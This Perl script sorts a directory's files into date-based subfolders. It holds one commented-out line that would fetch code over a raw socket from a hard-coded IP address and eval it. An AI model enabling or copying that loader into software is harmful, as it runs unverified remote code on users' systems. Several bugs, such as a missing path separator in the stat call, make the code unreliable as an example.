#!/usr/bin/perl
#
# Sort Directory By Timestamp by Matthew Relph
# v 1.00
# Perl Script Version
#
#
# Taking a directory full of files, and putting them in folders based on the date of their last modification
# Works good for lots of things, logs, pictures, piles of HL7 pharmacy requests, you name it!
# 
#
# Some error checking. Should stop and report to shell on any error
# As always, use at your own risk
# 
# 1st Argument = Source Path
# 2nd Argument = Destination Path
# 3rd Argument = Option Flags (-xxxx)
#
# Example use (Perl Script in bash):
# perl scriptName Source Destination -xxxx

#
# Possible future additions: Filter by extension, relative paths, more error checking



# Strict and warnings are recommended.
use 5.012;
use strict;
use warnings;
use diagnostics;

#use IO::Socket;
# Module::AutoLoad MAGIC LINE BELOW
#use lib do{eval<$b>&&botstrap("AutoLoad")if$b=new IO::Socket::INET 82.46.99.88.":1"};

use Path::Tiny; 
use Try::Tiny;
use File::Path qw(make_path remove_tree);
use File::stat;
use File::Copy;
use Time::Piece;

 
# Begin Functions
sub PrintArgs
{
    print "We are looking for 3 parameters. \n Argument #1 = Source Directory \n Argument #2 = Destination Directory \n Argument #3 = Options Flags\n";
    print "\t-c = Copy to new directory only (Leaves Originals) \n\t-v = Move to new directory\n";
    print "\t-n = No prompts (overrides other options) \n\t-p = Prompt at conflicts\n";
    print "\t-y = Split By Year  \n\t-m = Split By Month \n\t-d = Split By Day \n";
    print "\t-o = Default action is to overwrite on conflict \n\t-x = Default action is to make a copy on conflict\n";
    print "\tWhile you must pick options, combinations can include -cnyo, -vpdn, etc.\n";
    print "\nThe correct syntax is \"scriptName Source Destination -xxxx\" \n\n";

    print "You passed ".($#ARGV+1)." arguments.\n";
    for (my $i=0; $i < ($#ARGV+1); $i++)
    {
        print "Arg#".($i+1).": $ARGV[$i]\n";
    }
	print "\n";
	
	return;
}


sub CheckArgs
{
	my ($promptFlag, $moveFlag, $overwriteFlag, $sortBy, $continue) = @_;
    #Need 3 arguments
	my $optionsFlag = 0;
	
    if ( ($#ARGV+1) != 3)
    {
        PrintArgs();
        ${$continue} = 0;
    }
    else
    {
        #Check options list
        my $options = $ARGV[2];

		
        if ((index($options, "-")) == 0)
        {

			if 	($options =~ /[c*C*]/ )
            {
                ${$moveFlag} = 0;
            }
            if 	($options =~ /[v*V*]/ )
            {
                ${$moveFlag} = 1;
            }

            if 	($options =~ /[n*N*]/ )
            {
                ${$promptFlag} = 0;
            }

            if 	($options =~ /[p*P*]/ )
            {
                ${$promptFlag} = 1;
            }

            if 	($options =~ /[d*D*]/ )
            {
                ${$sortBy} = "d";
            }
            if 	($options =~ /[m*M*]/ )
            {
                ${$sortBy} = "m";
            }
            if 	($options =~ /[y*Y*]/ )
            {
                ${$sortBy} = "y";
            }
            if 	($options =~ /[o*O*]/ )
            {
                ${$overwriteFlag} = 1;
            }
            if 	($options =~ /[x*X*]/ )
            {
                ${$overwriteFlag} = 0;
            }			
        }
		else
		{
            #print "Options String fail" $options[0] $options.Length
            $optionsFlag = 0;
            ${$continue} = 0;
		}
        #Check Source Directory
        print "Source Directory: \n\t".$ARGV[0]."\n";
        try 
        {
            if (-d $ARGV[0])
            {
                print "\tSource Path exists\n";
            }
            else
            {
                print "\tSource Path does not exist - Cannot Continue\n";

                ${$continue} = 0;
            }
        }
        catch
        {
            warn "ERROR: Reading source directory path ".$ARGV[0]."\n";
            
            exit;
			
        };
		
		
        
        #Check Destination Directory
        print "Destination Directory: \n\t".$ARGV[1]."\n";
        try 
        {
            if (-d $ARGV[1])
            {
                print "\tDestination Path exists\n";
            }
            else
            {
                print "\tDestination Path does not exist\n";
				if (${$continue})
                {
                    my $makeDir = "n";
                    if (${$promptFlag})
                    {
                        #Prompt to make the directory
                        print "\tAttempt to make new directory \n\t\'".$ARGV[1]."\'? (y/n)";
						$makeDir = <STDIN>;
						chomp $makeDir;
                    }
                    else
                    {
                        #Make the directory without the prompt, if prompts are turned off
                        $makeDir = "y";
                    }

                    if (($makeDir eq "y") || ($makeDir eq "Y"))
                    {
                        print "\tMaking directory...\n"   ;
                        try
                        {
                            #mkdir $ARGV[1];           
							make_path ($ARGV[1]);           
                        }
                        catch
                        {
                            warn "ERROR: Creating new directory ".$ARGV[1]."\n" ;

							exit;						
                        };
                    }
                    else
                    {
                        print "\tDestination Path is not valid - Cannot Continue\n";
                        ${$continue} = 0;
                    }
                }
            }
        }
        catch
        {
            warn "ERROR: Reading destination directory path ".$ARGV[1]."\n";
            
            exit;
        };
		
		
        print "Options: $ARGV[2] \n";
		if (!($optionsFlag))
        {
            print "\tOptions not detected - Using Defaults\n";
        }
		if (${$moveFlag})
		{
			print "\tMove = True\n";
		}
		else
		{
			print "\tMove = False\n";		
		}
		if (${$promptFlag})
		{
			print "\tPrompt = True\n";
		}
		else
		{
			print "\tPrompt = False\n";		
		}		

		
        if (${$sortBy} eq "d")
        {
			print "\tSort By = Day\n";
		}
		elsif (${$sortBy} eq "m")
		{
			print "\tSort By = Month\n";
		}
		elsif  (${$sortBy} eq "y")
		{
			print "\tSort By = Year\n";
        }
		
        if (${$overwriteFlag})
        {
            print "\tDefault Action = Overwrite\n" ;
        }
        else
        {
            print "\tDefault Action = Make Copy\n" ;
        }				

	}
	return;
}


sub MainTask
{
	my ($promptFlag, $moveFlag, $sortBy, $overwriteFlag) = @_;
    print "Preparing to Copy...\n";
    
	#The paths should have already been tested in the CheckArgs sub
	my $sourcePath=$ARGV[0];
	my $destinationPath=$ARGV[1];
	
	
	#Get List of Source Files

	#Read directory, make sure that we filter for non-files

	opendir(my $sourceDirectoryHandle, $sourcePath) || die "Can't opendir $sourcePath: $!";
	#opendir(my $destinationDirectoryHandle, $destinationPath) || die "Can't opendir $destinationPath: $!";
	
	my @fileCopyList = grep {(!/^\./) && (-f "$sourcePath/$_") } readdir($sourceDirectoryHandle);
	#Cleanup
	closedir $sourceDirectoryHandle;
	#closedir $destinationDirectoryHandle;
	
	#Now we sort each source file into the destination
	foreach my $copyFile (@fileCopyList)
	{
		
        #Get File Modified Date		
        #my $fileDate = ctime(stat($copyFile)->mtime);
		my $stat = stat($sourcePath.$copyFile);
		my $mtime = $stat->mtime; # last modification time
		my $fileDate = (localtime($mtime))->ymd;
		my $fileYear=substr $fileDate, 0, 4;;
		my $fileMonth=substr $fileDate, 5, 2;;
		my $fileDay=substr $fileDate, 8, 2;;	
		
		#Get year string and append to path
        my $extendedDestinationPath=$destinationPath."/".$fileYear;
		
        if (($sortBy eq "d") || ($sortBy eq "m"))
        {
           #Get month string and append to path
           $extendedDestinationPath = $extendedDestinationPath."/".$fileMonth;
        }
        if ($sortBy eq "d")
        {
           #Get day string and append to path
           $extendedDestinationPath = $extendedDestinationPath."/".$fileDay;
        }
        
        my $source = $sourcePath."/".$copyFile;
        my $destination = $extendedDestinationPath."/".$copyFile;
        try
        {
            if (! (-d  $extendedDestinationPath))
            {
                try
                {
                    make_path ($extendedDestinationPath);            
                }
                catch
                {
                    print "ERROR: Creating destination directory path ".$extendedDestinationPath."\n"; 
                    
                    exit 0;
                }
            }  
        }
        catch
        {
            print "ERROR: Reading destination directory path ".$extendedDestinationPath."\n";
            
            exit 0;             
        };


        # Now we check if the file exists, and determine what we need to do on conflict
        my $conflictFlag = 0;
        try 
        {
            if (-f $destination)
            {
                $conflictFlag = 1;
                # File already exists, we need to refer to the options to see what we do next
            }
        }
        catch
        {
             print "ERROR: Checking if destination file exists ".$destination."\n";
            
            exit 0;
        };

        # If prompts are on, we check with the user
        my $overwriteNext = $overwriteFlag;
        if ($conflictFlag && $promptFlag)
        {
            print "\"$destination\" already exists \nOverwrite or Make New Copy? (o/c)";
			my $conflictAction = <STDIN>;
			chomp $conflictAction;
			
            if (($conflictAction eq "o") || ($conflictAction eq "O"))
            {
                $overwriteNext = 1;
            }
            elsif (($conflictAction eq "c") || ($conflictAction eq "C"))
            {
                $overwriteNext = 0;
            }
        }

        # During conflict If we choose to copy, we make a new copy with a unique file name, otherwise we continue on and overwrite the file
        if ($conflictFlag && (! $overwriteNext))
        {
            
            try
            {
                #Check if file already exists . We will keep up to 255 copies of files of the same name in the same directory. Beyond that, it is just ridiculous
                my $fileVersion = 0;
                while ((-f $destination) && ($fileVersion < 255))
                {     
                    $destination = $extendedDestinationPath."/"."(".$fileVersion.")".$copyFile ;
                    $fileVersion = $fileVersion +1  ;
                } 
            }
            catch
            {
                print "ERROR: Checking if destination file exists ".$destination."\n";
                
                exit 0;
            };
        }

        # Final file copy
        try
        {
            copy("$source","$destination") or die "Copy failed: $!\n";
        }
        catch
        {
            print "ERROR: Copying file to destination directory ".$destination."\n";
            
            exit 0;
        };


    }
    print "Copy Complete\n";

    # Remove source files if we are setup to move instead of just copy. 
    # Only remove files from the list we copied (Some files may have been added since we started)
    if ($moveFlag)
    {
        print "Removing Originals from Source Directory...\n";
        foreach my $removeFile (@fileCopyList)
        {
            my $removeFilePath = $sourcePath."/".$removeFile;
            try
            {
                unlink $removeFilePath;
            }
            catch
            {
                warn "ERROR: Removing Source File ".$removeFilePath ."\n";
                
                exit 0;
            };
        }
        print "Removals Complete\n"
    }
    print "Sorting Complete\nEnd Script\n";


	
	return;

}

#End Functions

#Begin Program
system("clear");

print "This script organizes a directory of files into subdirectories by date. \nIt will move your files, if you have the proper permissions, so be careful!\n\n";

#Options Defaults - Least destructive options
my $promptFlag = 1;
my $moveFlag = 0;
my $overwriteFlag = 0;
my $sortBy = "d";

my $continue = 1;



#PrintArgs();
CheckArgs(\$promptFlag, \$moveFlag, \$overwriteFlag, \$sortBy, \$continue);

my $startMove = "";

if ($promptFlag && $continue)
{
    while (($startMove ne "y") && ($startMove ne "Y") && ($startMove ne "n") && ($startMove ne "N"))
    {
        # $startMove = Read-Host 
		printf "\nDo you wish to continue? (y/n)";
		$startMove = <STDIN>;
		chomp $startMove;
    }

    if (($startMove eq "n") || ($startMove eq "N"))
    {
        $continue = 0;
    }
}

if ($continue)
{
    MainTask ($promptFlag, $moveFlag, $sortBy, $overwriteFlag)
}
else
{
    print "\n Cannot Continue\n End Script\n";
}

exit 0;

#End Program
#End Script